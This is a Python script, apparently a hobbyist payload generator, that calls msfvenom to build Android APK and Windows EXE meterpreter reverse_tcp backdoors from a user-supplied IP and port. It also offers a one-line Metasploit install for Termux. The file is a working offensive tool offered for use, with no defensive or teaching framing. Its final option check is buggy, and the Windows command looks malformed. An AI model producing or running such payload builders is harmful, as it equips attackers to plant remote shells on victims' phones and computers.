import os
os.system("clear")
ip= "0"
port= "0"
apk_name= "0"
windows_name= "0"
print("""

      ¸.· ´::::::´: . · .¨............. ::` ·.¸ 
   ¸·´,;':::::::' :· .     ·   .  :      ::::::`·¸ 
 ¸·;;;;'::::::: · . :'      ·    .     .  :::::::::·¸ 
,;;;;;;:::::::.:. ·         ·     :       :::::::::::.   
;;;;;;;;::::::..· :´  .       '     ·     .:::::::::::::                                        
';;;;;;;;,:::'::·.......¸.·:ˆ:·.¸.......::::::::::::::::: 
 ';;;;;;;;;;;;;;,,¸:::::::::;::::::::::::::::::::::::::' 
'  ';.¸.-·~·-.,¸;;;;;;,:::´`:::::::::::¸,.-·~·-.¸.::' 
    ;;`·.¸      ¯¨*·.¸';;.'::::.¸.·*¨¯       ¸.·´:: 
    ';;:::'`·.¸         ')`:::::(          ¸.·´ :::: 
     `·.::::::`·-—-·´ :::::: `·—–-·´ .::::·´ 
         `·,;;:::.  :·:´ø· ø `. ::. ' ·.:::·´ 
            `·-.:::.·: ::.:.: · : ::: :.-·´ 
               '`·.::.·——-~ .::·´ 
                 )`·.:.  : . ·.::·´( 
                /',; '`·——·´  :.'\ 
   _¸.——·´,;;;             .:::.`·——.¸_ 
.·´   |`:¯'`: |`:¯`:    |`:¯'`: |`·.¯¯¯¯`·´¯('|`:¯`·.  |`:¯: 
    .·´ .·´|`·.`:   :    `':   :  `·.`·.`·.¯`·.·´|'`: :`·.`·.`: : 
.·´  .·´__|   `·. :      |`·. `·.  `·. )  `>|.·'  : :`·.`·.`' ': 
:    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
|`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
`·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
   |___'|.·´—DaiR——[•ˆ)/sn•]—[•SiN•]——-«•š GOURAB DEBNATH
 '######::::'#######::'##::::'##:'########:::::'###::::'########::
'##... ##::'##.... ##: ##:::: ##: ##.... ##:::'## ##::: ##.... ##:
 ##:::..::: ##:::: ##: ##:::: ##: ##:::: ##::'##:. ##:: ##:::: ##:
 ##::'####: ##:::: ##: ##:::: ##: ########::'##:::. ##: ########::
 ##::: ##:: ##:::: ##: ##:::: ##: ##.. ##::: #########: ##.... ##:
 ##::: ##:: ##:::: ##: ##:::: ##: ##::. ##:: ##.... ##: ##:::: ##:
. ######:::. #######::. #######:: ##:::. ##: ##:::: ##: ########::
:......:::::.......::::.......:::..:::::..::..:::::..::........:::
 """)
print("...................................................................")
print("This tool has been created by Gourab Debnath")
print("Here is the E-mail ID (gd275097@gmail.com) to conract with his")
print("...................................................................")
print("This tool generating PAYLOAD easily")
print("Here are good platforms to generate the payload easily")
print("1.ANDROID")
print("2.WINDOWS")
print("3.INSTALL METASPLOIT ONLY FOR TERMUX(FOR ANDROID 7 AND HIGHER)")
platforms = int(input("Enter the number: "))
def android():
    global ip, port, apk_name
    print("Enter the ip address: ")
    ip = input()
    print("Enter the port: ")
    port = input()
    print("Enter the name of apk with .apk extension: ")
    apk_name = input()
def windows():
    global ip,port,windows_name
    print("Enter the ip address: ")
    ip = input()
    print("Enter the port: ")
    port = input()
    print("Enter the name of exe file with .exe extension: ")
    windows_name = input()
if platforms == 1:
    android()
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" "+"LPORT="+port+" "+"R >"+" "+apk_name)
    print("your payload have been created")
    print("you can see it with msfconsole")
if platforms == 2:
    windows()
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" "+"LPORT="+port+" "+" -f exe -o >"+" "+windows_name)
    print("your payload have been created")
    print("you can see it with msfconsole")
if platforms == 3:
    os.system("pkg install unstable-repo && pkg install metasploit")
if platforms <= 4:
    print("THERE IS NO OPTION"," ",platforms)